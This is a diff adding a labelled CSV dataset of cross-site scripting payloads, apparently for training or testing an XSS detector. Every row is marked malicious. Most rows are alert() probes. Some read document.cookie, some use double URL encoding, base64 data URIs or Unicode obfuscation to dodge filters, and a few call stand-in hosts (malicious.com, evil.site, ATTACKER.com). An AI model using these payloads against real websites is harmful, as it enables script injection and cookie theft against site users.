@@ -1,0 +1,45 @@
+text,label
+%19Jav%2509asc%2509ript%253ahttps%2520%253a%252f%252fATTACKER.com%252f%250Aalert%2528document.domain%2529,1
+/(A(%22%20%252fonmouseover=%22alert%25%32%38%64%6f%63%75%6d%65%6e%74.%64%6f%6d%61%69%6e%25%32%39%22))/,1
+(F(%22%20%252fonmouseover=%22%2561%256c%2565%2572%2574%2528%2564%256f%2563%2575%256d%2565%256e%2574%252e%2567%2565%2574%2545%256c%2565%256d%2565%256e%2574,1
+alert(document.domain),1
+iqz78'%3e%3cimg%20src%3da%20onerror%3dalert(document.cookie)%3d1%3echplq,1
+%7D)</script><svg+onload=confirm(location)>,1
+%253C/script%253E%253Csvg+onload=confirm(location)%253E,1
+%26%2302java%26%23115cript:alert(document.cookie);//,1
+"<svg><![CDATA[><table background=]])>""></svg>""",1
+__proto__.innerHTML=<iframe%20srcdoc%3d'<script%20src%3d%26quot%3bhttps%3a//cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.min.js%26quot%3b'>,1
+><svg/onload=alert(document.domain)>,1
+%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28document.cookie%29%3E,1
+%3C%3C/%3Cx%3E/script/test000%3E%3C%3C/%3Cx%3Esvg%20onload%3Dalert%28%29%3E%3C/%3E%3Cscript%3E1%3C%5Cx%3E2,1
+<script>alert('XSS')</script>,1
+<img src='x' onerror='alert(1)'>,1
+javascript:alert('XSS'),1
+<div onclick='alert(1)'>Click me</div>,1
+<svg><script>alert(1)</script></svg>,1
+<iframe src='javascript:alert(1)'></iframe>,1
+"\'><script>alert('Injected')</script>""",1
+<math><mi xlink:href='javascript:alert(1)'>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<body onload='alert(1)'>,1
+<div style='background:url(javascript:alert(1))'>,1
+<div>Hello</div><script>alert('test')</script>,1
+"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",1
+"<embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></embed>",1
+"<img src='data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+'>",1
+malicious_payload=alert(1);,1
+/search?q=<script>alert(1)</script>,1
+javascript:alert(document.cookie),1
+<script>fetch('http://malicious.com')</script>,1
+<div onmouseover='alert(1)'>Hover me</div>,1
+<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,1
+"<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>",1
+<svg onload='alert(1)'></svg>,1
+<div><img src=x onerror=alert('Injected')></div>,1
+<button onclick='executeDangerousFunction()'>Click</button>,1
+"<maction actiontype=\statusline#http://google.com\"" xlink:href=\""javascript:alert(2)\"">CLICKME</maction>""",1
+=[̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕ ,1
+c5obc'+alert(1)+'p7yd5,1
+"<video><source onerror=\javascript:alert(document.domain)\"">""",1
+%20alert(document.location),1
+"<tt onmouseover=\alert(1)\"">test</tt>""",1
